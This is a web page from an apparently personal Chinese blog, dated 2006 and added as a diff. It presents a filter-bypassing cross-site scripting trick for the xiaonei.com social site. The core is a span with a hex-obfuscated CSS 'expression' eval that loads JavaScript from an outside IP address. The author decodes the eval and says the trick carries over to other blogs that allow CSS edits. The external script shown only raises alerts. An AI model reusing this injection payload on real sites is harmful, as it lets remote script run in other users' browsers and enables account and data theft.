@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>[原创]校内网导入外部Javascript脚本跨站 – est の 输入 输出和出入</title>
+<link rel="icon" href="https://est.im/favicon.svg">
+    <meta charset="utf-8" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta http-equiv="Content-Security-Policy" content="frame-ancestors 'self' https://disqus.com https://player.bilibili.com https://www.youtube.com;">
+    <link href="https://feeds.feedburner.com/initiative" type="application/rss+xml" rel="alternate" title="est の 输入 输出和出入 RSS Feed" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="[原创]校内网导入外部Javascript脚本跨站" />
+
+    <link rel="canonical" href="https://blog.est.im/nu/11543" />
+    <meta property="og:url" content="https://blog.est.im/nu/11543">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="[原创]校内网导入外部Javascript脚本跨站">
+
+    <link rel="stylesheet" href="/theme/css/normalize.min.css" />
+    <link rel="stylesheet" href="/theme/css/style.css" />
+
+
+    <style>
+      body {
+        background: #ecedef url("/theme/img/ignasi_pattern_s.png") repeat;
+      }
+    </style>
+  </head>
+  <body class="single-body">
+<nav class="nav-bar side-padding">
+  <h1 class="nav-header"><a href="/" class="nav-text">
+    est の 输入 输出和出入
+  </a></h1>
+  <div class="hamburger-menu">
+    <button>
+      <span></span>
+      <span></span>
+    </button>
+    <ul id="menu" class="hamburger-menu-overlay">
+      <li><a href="/" class="hamburger-menu-overlay-link">Home</a></li>
+      <li><a href="https://feeds.feedburner.com/initiative" class="hamburger-menu-overlay-link">RSS</a></li>
+      <li><a href="/about" class="hamburger-menu-overlay-link">About</a></li>
+      <li><a href="/category" class="hamburger-menu-overlay-link">Category</a></li>
+
+    </ul>
+  </div>
+</nav>    <main class="content side-text-padding">
+<article class="post">
+  <header class="post-header">
+    <h2 class="post-title">[原创]校内网导入外部Javascript脚本跨站</h2>
+    <p class="post-date">Posted <time datetime="2006-11-08T17:36:00+08:00">2006-11-08</time> | <span>archive</span></p>
+  </header>
+
+  
+  <p>弄了3个时辰～～痛苦不堪回首～～js基础太差，被51js.com上的高手鄙视了好久。</p>
+<p>1. 在你的 校内网 涂鸦版里插入以下代码：</p>
+<pre><code class="language-html">&lt;span id=spantarget&gt;&lt;/span&gt;
+&lt;span id=&quot;jsInject&quot; style=&quot;color:expression(eval(' \\\x74\\\x72\\\x79\\\x7B\\\x65\\\x73\\\x74\\\x2B\\\x2B\\\x3B\\\x7D\\\x63\\\x61\\\x74\\\x63\\\x68\\\x28\\\x65\\\x29\\\x7B\\\x65\\\x73\\\x74\\\x3D\\\x30\\\x3B\\\x7D\\\x3B\\\x69\\\x66\\\x20\\\x28\\\x65\\\x73\\\x74\\\x3C\\\x31\\\x29\\\x7B\\\x76\\\x61\\\x72\\\x20\\\x6F\\\x4A\\\x53\\\x3D\\\x64\\\x6F\\\x63\\\x75\\\x6D\\\x65\\\x6E\\\x74\\\x2E\\\x63\\\x72\\\x65\\\x61\\\x74\\\x65\\\x45\\\x6C\\\x65\\\x6D\\\x65\\\x6E\\\x74\\\x28\\\x27\\\x73\\\x63\\\x72\\\x69\\\x70\\\x74\\\x27\\\x29\\\x3B\\\x6F\\\x4A\\\x53\\\x2E\\\x73\\\x72\\\x63\\\x3D\\\x27\\\x68\\\x74\\\x74\\\x70\\\x3A\\\x2F\\\x2F\\\x32\\\x30\\\x32\\\x2E\\\x31\\\x31\\\x35\\\x2E\\\x32\\\x32\\\x2E\\\x31\\\x34\\\x31\\\x2F\\\x65\\\x73\\\x74\\\x2F\\\x78\\\x69\\\x61\\\x6F\\\x6E\\\x65\\\x69\\\x2E\\\x6A\\\x73\\\x27\\\x3B\\\x73\\\x70\\\x61\\\x6E\\\x74\\\x61\\\x72\\\x67\\\x65\\\x74\\\x2E\\\x61\\\x70\\\x70\\\x65\\\x6E\\\x64\\\x43\\\x68\\\x69\\\x6C\\\x64\\\x28\\\x6F\\\x4A\\\x53\\\x29\\\x3B\\\x7D ') )&quot;&gt;&lt;/span&gt;
+</code></pre>
+<p>其中转义字符为：</p>
+<p><code>try{est++;}catch(e){est=0;};if (est&lt;1){var oJS=document.createElement('script');oJS.src='//./est/xiaonei.js';spantarget.appendChild(oJS);}</code></p>
+<p>2. 用到的外部javascript:</p>
+<pre><code>alert('External Javascript loaded!');
+jsInject.cssText=&quot;&quot;;
+alert('Expression stoped');
+</code></pre>
+<p>原创辛苦啊～～太累了！！！！严重影响了我的半期复习！！我简直再也不想摸javascript了～～～</p>
+<p>主要原因也是xiaonei.com把脚本封得太严了，script被当作关键词过滤， &amp; 被转义了，onload等所有事件也被过滤，javascript: 协议被删除了 script 关键词。很多都没法用。</p>
+<p>我会把我的blog用ajax集成到我的校内网的，呵呵。</p>
+<p>其实，这个弄懂了，很多blog也支持CSS修改，一样的可以插入外部javascript的。</p>
+</article>
+
+<div class="comments">
+  <h2>Comments</h2>
+  <script type="text/javascript" defer src="https://c.est.im/req4cmt.js"></script>
+</div>    </main>
+
+
+  </body>
+
+</html>
